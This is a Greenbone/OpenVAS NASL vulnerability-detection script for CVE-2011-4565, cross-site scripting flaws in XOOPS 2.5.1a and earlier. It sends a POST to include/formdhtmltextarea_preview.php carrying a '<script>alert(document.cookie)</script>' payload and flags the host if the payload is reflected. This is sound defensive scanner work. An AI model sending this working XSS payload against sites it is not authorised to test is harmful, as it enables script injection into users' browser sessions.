# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:xoops:xoops";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802351");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2011-4565");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-12-05 15:17:25 +0530 (Mon, 05 Dec 2011)");
  script_name("XOOPS 'text' and 'message' Parameter Cross-Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_xoops_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("XOOPS/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46238");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49995");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/70377");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/70378");
  script_xref(name:"URL", value:"http://xoops.org/modules/news/article.php?storyid=6094");
  script_xref(name:"URL", value:"https://www.htbridge.ch/advisory/multiple_xss_in_xoops_web_application_platform.html");

  script_tag(name:"summary", value:"XOOPS is prone to cross site scripting vulnerabilities.");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input to

  - The 'text' parameter to include/formdhtmltextarea_preview.php (when 'html'
  is set to '1'),

  - The '[img]' BBCode tag in the 'message' parameter to pmlite.php script,
  which allows attacker to execute arbitrary HTML and script code on the
  user's browser session in the security context of an affected site.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"XOOPS version 2.5.1a and prior.");

  script_tag(name:"solution", value:"Upgrade to XOOPS version 2.5.3 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:port );

url = dir + "/include/formdhtmltextarea_preview.php";

postdata = "html=1&text=<script>alert(document.cookie)</script>";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);
res = http_keepalive_send_recv( port:port, data:req );

if( res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
